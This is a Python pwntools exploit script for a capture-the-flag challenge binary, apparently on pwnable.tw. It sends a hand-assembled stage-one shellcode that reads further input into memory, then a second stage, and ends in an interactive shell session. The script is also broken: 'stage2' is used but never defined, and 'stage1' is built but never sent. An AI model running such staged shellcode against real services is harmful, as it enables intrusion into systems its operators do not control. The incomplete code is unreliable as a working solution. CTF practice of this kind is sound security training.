#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")
libc = ELF("./libc.so.6")

local = True 
if local:
    p = process("./chall_patched")
    gdb.attach(p,'''b*main+548\nc\nb*0x1337000\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./chall_patched', checksec=False)

stage1 = asm(f"""
    xor edi, edi
    mov esi, edx
    syscall
    """, arch='amd64')

shellcode = b"\x31\xFF\x89\xD6\x0F\x05"
p.sendafter(b"======================================", shellcode)



p.sendline(stage2)

p.interactive()